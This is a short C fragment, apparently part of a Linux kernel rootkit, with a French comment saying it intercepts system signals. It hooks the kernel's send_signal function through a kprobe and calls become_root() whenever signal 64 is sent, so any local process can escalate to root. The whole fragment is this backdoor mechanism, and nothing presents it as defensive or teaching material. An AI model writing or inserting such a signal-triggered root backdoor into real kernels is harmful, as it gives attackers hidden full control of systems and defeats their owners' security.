/*
 *
 * Ce script tente intercepte les signaux systèmes
 *
 */

#include "rootest.h"

#define ROOT_SIGNAL 64

int handle_signal_send(struct kprobe *kp, struct pt_regs *regs) {
  int sig = regs->si;

  if (sig == ROOT_SIGNAL) {
    become_root();
  }
  return 0;
}

struct kprobe sig_kp = {
  .symbol_name = "send_signal",
  .pre_handler = handle_signal_send,
};
